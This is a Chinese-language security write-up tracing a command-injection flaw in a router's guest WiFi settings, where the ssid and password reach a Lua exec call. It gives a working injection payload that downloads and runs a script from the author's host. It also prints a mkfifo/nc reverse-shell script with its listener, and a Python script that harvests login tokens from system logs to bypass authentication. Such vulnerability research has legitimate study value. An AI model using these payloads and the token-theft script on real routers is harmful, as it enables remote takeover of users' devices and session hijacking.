0x01 漏洞成因

沿着上篇文章中的思路，我们还是先说一下漏洞的成因。

问题发现于函数wifiShareRentSwitch,在此函数中调用了Luci.Util.exec()来执行命令，而通过分析后发现ssid和password对于用户来说是可控的，我们尝试对ssid和password的来源进行追踪。

依据固件中的代码ssid和password 获取自函数XQWifiShare.wifi_share_info() ，跟踪函数，发现函数所在文件名为XQWifiShare.lua，跟踪函数发现

局部变量guest变量获取自wifi.getGuestWifi(1)方法，此方法在XQWifiUtil.lua文件中定义，继续追踪方法getGuestWifi(1)

此方法主要用于获取访客WiFi的信息包括ssid、password(key)、encryption等信息，获取自函数Uci:get_all()

这里对UCI做下简单介绍：

UCI是集中式配置信息管理接口(Unified Configuration Interface)的缩写，是OpenWrt引进的一套配置参数管理系统，包含了网络配置、无线配置、系统信息配置等作为基本路由器所需的主要配置参数，UCI的配置文件全部存储在/etc/config目录下。

根据此处可发现ssid以及password是获取自guestwifi，而guestwifi中的变量由分析可知获取自文件配置文件/etc/config/wireless。

好了，我们知道了ssid以及password是获取自配置文件wireless，而我们知道共享wifi由路由器后台设置的，所以我们尝试追踪共享wifi设置时将变量写入wireless的过程。

登录路由器后台，进入常用设置->WiFi设置->访客wifi设置处，我们随便设置一个访客wifi。

保存后，获取此时的数据包，如图通过POST请求了地址http://serverip/cgi-bin/luci/;stok=xxxxx/api/xqnetwork/set_wifi

传递参数包括wifiIndex& ssid&pwd&mixed-psk，我们尝试追踪此过程，查看参数传递过程，进入文件/api/xqnetwork可以看到入口set_wifi调用了函数setWifi方法。

在其文件中追踪setWifi函数，它获取了来自HTTP请求传来的参数ssid以及password等用于在后面使用。

上图红色标记部分是设置访客wifi的过程，跟踪函数XQGuestWifi.setGuestWifi()

在函数第四行处又调用了XQWifiUtil中的函数setGuestWifi()，继续看

函数setGuestWifi中对ssid、key、encryption等信息进行了设置，最后写入到了wireless文件中:

uci:section("wireless", "wifi-iface", wifinetid, guestwifi)

uci:commit("wireless")

0x02 漏洞复现

在对固件进行分析的过程中，由于设置访客wifi处对长度进行了限制，所以我们采用了在服务器上开启服务通过此漏洞下载并执行我们的恶意脚本。

payload如下：

$(cd /tmp/;curl 192.168.31.52:8000/1.txt >> 1;chmod 777 1;./1)                          #192.168.31.52 为我本机的IP，8000为本地启动的监听服务。

恶意脚本内容：

rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/ash -i 2>&1 | nc 192.168.31.52 1234 >/tmp/f

本地使用nc进行监听：

./nc -lvvvp 1234

0x03 绕过限制攻击路由器

由于以上漏洞是在设置访客Wi-Fi处，需要进行登录才可以实现攻击过程，所以我们结合之前制作的EvilUSB，通过读取系统日志的方法提取用户登录后的token。

获取token 的脚本如下：

def ReadTokens(ip,port):

    tok_dic = {}

    try:

        httpClient = httplib.HTTPConnection(ip, port, timeout=30)

        httpClient.request('GET','/api-third-party/download/extdisks/******/******')

        response = httpClient.getresponse()

        c = response.read()

        buff = StringIO.StringIO(c)

        for l in buff.readlines():

            res = re.search(r'^(.+?)\s.+;stok=(.+?)/', l)

            if res:

                tok = res.group(2)

                date = res.group(1)

                tok_dic[tok] = date

    except Exception, e:

        print e

    finally:

        if httpClient:

            httpClient.close()

        print tok_dic
